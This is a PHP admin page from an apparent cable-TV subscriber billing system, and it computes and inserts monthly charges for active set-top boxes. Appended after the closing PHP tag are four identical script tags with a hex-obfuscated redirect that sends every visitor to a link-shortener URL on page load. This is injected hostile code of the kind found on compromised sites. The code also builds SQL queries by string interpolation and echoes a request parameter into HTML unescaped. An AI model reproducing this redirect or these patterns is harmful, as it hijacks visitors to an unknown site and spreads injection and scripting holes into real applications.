<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    $date               = $objMisc->changeDateFormat($_POST['month_date']);
    $subscribers=" SELECT B.`SUBSCRIBER_ID`,B.`PACKAGE_ID`,B.`LA_CARTE_ID`,P.`PARENT_CHARGES`,B.STB_ID FROM `stb_box` B JOIN `package_master` P ON P.`PACKAGE_ID`=B.`PACKAGE_ID` WHERE  B.`STATUS`='A' AND B.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]'";
    $sql=$objMisc->getAllRecordsNew($subscribers);
    $subscriber_id=0;
    $subscriberCount=0;
        foreach ($sql as $k => $row) {
            $subscriber_id  = $row['subscriber_id'];
            $stb_id  = $row['stb_id'];
            $month=date('m');
            $laCarteCharges=0;
            if($row['la_carte_id']!='0'){
                $laCarteCharges=$objMisc->GiveValue("PACKAGE_ID='$row[la_carte_id]'",'PARENT_CHARGES','package_master');
            }
            $checkExistance=$objMisc->GiveValue("SUBSCRIBER_ID='$subscriber_id' AND MONTH(MONTH_DATE)='$month' AND STB_ID='$stb_id'",'ID','monthly_charges');
            if (empty($checkExistance)) {
                $subscri_id  = $row['subscriber_id'];
                if($subscri_id!=$row['subscriber_id']){
                    $subscriberCount=$subscriberCount+1;
                }   
                $amount         = $row['parent_charges']+$laCarteCharges;
                $rowArray       = array('HEADOFFICE_ID'     =>$_SESSION['HEADOFFICE'],
                                        'SUBSCRIBER_ID'     =>$subscriber_id,
                                        'STB_ID'            =>$stb_id,
                                        'AMOUNT_TYPE'       =>'D',
                                        'MONTH_DATE'        =>$date,
                                        'AMOUNT'            =>$amount,
                                        'ADDED_BY'          =>$_SESSION['EMPLOYEE_ID'],
                                        'ADDED_TIME'        =>date('Y-m-d H:i:s'));
                $val            = $objMisc->insert('monthly_charges',$rowArray);
                $amount=0;
            }
        }
        $_SESSION['subscriberCount']=$subscriberCount;
        $_SESSION['msg'] = (($subscriberCount>=0)?1:2);
        header("location:monthly-utility.php");
        exit;
    
}
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
$subscriberCount = isset($_SESSION['subscriberCount']) ? $_SESSION['subscriberCount'] : $subscriberCount;
unset($_SESSION['msg']);
unset($_SESSION['subscriberCount']);
switch ($msg)
{
	case 1:
		$msg = "Utility ran successfully for ".$subscriberCount." subscribers.";
    break;
    case 2:
		$errormsg = "Utility for this month already run.";
        $msg = "";
    break;
    case 3:
		$msg = "Record has been deleted successfully.";
	break;    
    case 4:
        $errormsg = "Sub area name already exists.";
        $msg = "";
    break;
     case 5:
        $errormsg = "Sub area name already exists.";
        $msg = "";
    break;
}
/*if($id){
    $where = 'UNIT_ID = '.$id;
    $rowArray = $objMisc->getRow("unit_master",$where);
}
$wherethis = " 1=1 AND USER_ID='$_SESSION[USER_ID]' ORDER BY `UNIT_ID` DESC";
$classRecord = $objMisc->getAllRecordsPaging("*","unit_master",$wherethis);
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="30%">Sub Area</th><th width="25%">Headoffice Name</th><th width="25%">Area</th><th>Action';
if(is_array($classRecord[1])){ 
        $pagin_recs .='&nbsp;&nbsp;<a href="javascript:;" title="Check All"  onclick="check_all(\'artCatCount\',\'artCatCheckbox\')"><input type="checkbox"></a>&nbsp;&nbsp;All';
        
        $pagin_recs .= '&nbsp;&nbsp;<a href="javascript:;" title="Delete" onclick="return chkOptions_all(\'Delete\',frmListing,\'artCatCheckbox\',\'artCatCount\')" class="btn btn-danger">Delete</a>';
    
}
$pagin_recs .= '</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$rowRec['name'].'</td>';
            $headoffice_id =$objMisc->GiveValue(" WING_ID='$rowRec[wing_id]'",'HEADOFFICE_ID','wing_master');
            $pagin_recs .='<td>'.$objMisc->GiveValue("HEADOFFICE_ID='$headoffice_id'",'NAME','headoffice_master').'</td>';
            $pagin_recs .='<td>'.$objMisc->GiveValue("WING_ID='$rowRec[wing_id]'",'NAME','wing_master').'</td>';
            $pagin_recs .='<td> <input type="hidden" name="enumStatus'.$rowRec['unit_id'].'" id="enumStatus'.$rowRec['unit_id'].'"  value="'.$rowRec['status'].'">&nbsp;';
           // echo $_SESSION['USER_ID'];
                    if($rowRec['status']=='A')
                    {
                       $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['unit_id'].'" id="imgStatus'.$rowRec['unit_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['unit_id'].');">&nbsp;';
                    }
                    else
                    {
                       $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['unit_id'].'" id="imgStatus'.$rowRec['unit_id'].'" alt="Activate" title="Activate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['unit_id'].');">&nbsp;';
                    }
                
                $pagin_recs .='<a href="headoffice.php?id='.base64_encode($rowRec['unit_id']).'&page='.$_GET['page'].'"><img class="edit-btn" src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>&nbsp;';
                
                $pagin_recs .='<input type="checkbox" name="artCatCheckbox[]" value="'.$rowRec['unit_id'].'" id="artCatCheckbox_'.$i.'">&nbsp;';
                
                $pagin_recs .= '</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="4">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="4" align="center">No Record Found</td></tr></tbody>';
    }*/
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Edit Sub Area Information";
}else{
   $pageheading = "Run Monthly Utility"; 
}
$where           =   " 1 = 1 and STATUS = 'A' order by HEADOFFICE_ID";
//$headofficeArray      =   $objMisc->myFunc->fnWriteOptionList($rowArray['headoffice_id'],'NAME,HEADOFFICE_ID','headoffice_master',$where,0,0,0);  
$whereWing           =   " 1 = 1 and STATUS = 'A' and HEADOFFICE_ID='$_SESSION[HEADOFFICE]' order by WING_ID";
//$wingArray      =   $objMisc->myFunc->fnWriteOptionList($rowArray['wing_id'],'NAME,WING_ID','wing_master',$whereWing,0,0,0);  
$smartyVars['wingArray']            =   $wingArray;
$smartyVars['headofficeArray']      =   $headofficeArray;
$smartyVars['errormsg']     		=   $errormsg;
$smartyVars['add']          		=   $add;
$smartyVars['group']       		 	=   $id;
$smartyVars['rowRec']       		=   $rowArray;
$smartyVars['pageheading']  		=   $pageheading;
$smartyVars['classData']    		=   $pagin_recs;
$smartyVars['msg']         		 	=   $msg;
$smartyVars['page']         		=   $_REQUEST['page'];
$objMisc->displayPage("header,monthly-utility,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>